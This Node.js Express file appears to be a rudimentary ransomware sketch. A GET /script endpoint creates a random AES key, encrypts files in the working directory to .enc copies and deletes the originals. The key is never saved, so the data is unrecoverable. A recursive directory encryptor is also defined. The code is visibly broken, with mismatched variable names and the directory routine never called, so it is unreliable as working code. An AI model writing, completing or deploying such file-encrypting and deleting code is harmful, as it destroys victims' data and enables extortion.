const express= require("express");
const app = express();
app.use(express.json());
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");



app.get('/script', function(req, res){
    const key = crypto.randomBytes(32);
    const iv = crypto.randomBytes(16);
    const targetpath = './';
    try{
        encryptdata(targetpath, key, iv);
        console.log("Encrypting data");
        res.status(200).json({
            msg: "Encrypted Data...!"
        })
    }catch(e){
        res.status(500).json({
            msg: "error"
        })
    }
})

const encryptdata = (filepath, key, iv) => {
    const cipher  = crypto.createCipheriv('aes-256-ocb', key, iv);
    const input = fs.createReadStream(filepath);
    const output = fs.createWriteStream(`${filepath}.enc`);
    input.pipe(cipher).pipe(output);
    output.on('finish', () => {
        fs.unlinkSync(filePath);
    });

}

const encryptdir = (dirpath, key, iv) => {
    const cipher = crypto.createCipheriv("aes-256-ocb", key, iv);
    const input = fs.readdirSync(dirPath);
    input.forEach((item) => {
        const fullpath = path.join(dirpath, item);
        if(fs.lstatSync(fullpath).isDirectory()){
            encryptdir(fullpath , key, iv );
        }else{
            encryptdata(fullpath, key, iv);
        }
    });
};